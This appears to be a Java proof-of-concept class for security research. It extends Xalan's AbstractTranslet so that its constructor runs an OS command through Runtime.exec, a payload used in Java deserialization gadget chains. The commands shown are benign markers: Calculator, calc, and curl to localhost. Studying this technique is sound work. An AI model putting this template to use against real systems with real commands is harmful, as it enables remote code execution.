package com.anbai.sec.classloader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class TestAbstractTranslet extends AbstractTranslet {

	public TestAbstractTranslet() {
		String command = "open -a Calculator.app";
		String osName  = System.getProperty("os.name");

		if (osName.startsWith("Windows")) {
			command = "calc 12345678901234567";
		} else if (osName.startsWith("Linux")) {
			command = "curl localhost:9999/";
		}

		try {
			Runtime.getRuntime().exec(command);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {

	}

}